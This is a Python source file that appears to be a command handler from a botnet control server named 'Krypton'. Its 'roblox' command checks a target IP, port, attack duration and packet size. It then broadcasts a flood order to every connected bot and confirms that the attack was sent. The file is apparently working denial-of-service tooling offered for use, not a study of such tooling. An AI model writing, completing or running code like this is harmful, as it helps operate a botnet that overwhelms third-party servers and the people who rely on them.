from colorama import Fore

def roblox(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data):
    if len(args) == 5:
        ip = args[1]
        port = args[2]
        secs = args[3]
        size = args[4]
        if validate_ip(ip):
            if validate_port(port):
                if validate_time(secs):
                    if validate_size(size):
                        send(client, f"{Fore.LIGHTWHITE_EX}\nAttack successfully sent to all {Fore.LIGHTBLACK_EX}Krypton {Fore.LIGHTWHITE_EX}Bots!\n")
                        broadcast(data)
                    else:
                        send(client, Fore.RED + '\nInvalid packet size (1-65500 bytes)\n')
                else:
                    send(client, Fore.RED + '\nInvalid attack duration (10-1300 seconds)\n')
            else:
                send(client, Fore.RED + '\nInvalid port number (1-65535)\n')
        else:
            send(client, Fore.RED + '\nInvalid IP-address\n')
    else:
        send(client, '\nUsage: .roblox [IP] [PORT] [TIME] [SIZE]\n')